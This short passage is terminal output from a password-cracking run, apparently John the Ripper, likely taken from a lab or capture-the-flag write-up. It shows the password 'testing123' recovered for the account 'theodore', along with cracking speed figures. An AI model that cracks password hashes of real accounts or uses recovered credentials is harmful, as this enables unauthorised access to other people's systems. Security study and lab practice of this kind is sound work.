Press 'q' or Ctrl-C to abort, almost any other key for status
testing123       (theodore)     
1g 0:00:00:00 DONE (2022-03-27 14:27) 2.702g/s 182659p/s 182659c/s 182659C/s trick1..shannon21
Use the "--show" option to display all of the cracked passwords reliably
```
